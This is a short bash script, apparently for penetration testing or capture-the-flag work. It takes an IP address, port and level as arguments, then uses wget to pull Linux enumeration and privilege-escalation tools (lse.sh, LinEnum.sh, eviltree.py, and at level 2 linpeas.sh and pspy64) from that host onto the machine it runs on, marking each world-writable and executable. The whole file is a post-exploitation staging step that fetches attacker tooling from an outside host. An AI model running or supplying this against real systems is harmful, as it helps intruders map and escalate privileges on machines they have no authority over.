#!/bin/bash

while getopts i:p:l: flag
do
    case "${flag}" in
        i) ip=${OPTARG};;
        p) port=${OPTARG};;
        l) level=${OPTARG};;
    esac
done

if [ -z "$ip" ] || [ -z "$port" ] || [ -z "$level" ]
then
      echo "Usage: ./upload_me.sh -i <ip_address> -p <port> -l <level (1-2)>"
      exit
fi

echo "Using address: $ip:$port";

wget http://$ip:$port/linux/linux-smart-enumeration/lse.sh
chmod 777 ./lse.sh
wget http://$ip:$port/linux/LinEnum/LinEnum.sh
chmod 777 ./LinEnum.sh
wget http://$ip:$port/eviltree/eviltree.py
chmod 777 ./eviltree.py


if [ "2" -eq "$level" ]
then
    wget http://$ip:$port/linux/linpeas.sh
    chmod 777 ./linpeas.sh
    wget http://$ip:$port/linux/pspy64
    chmod 777 ./pspy64
fi


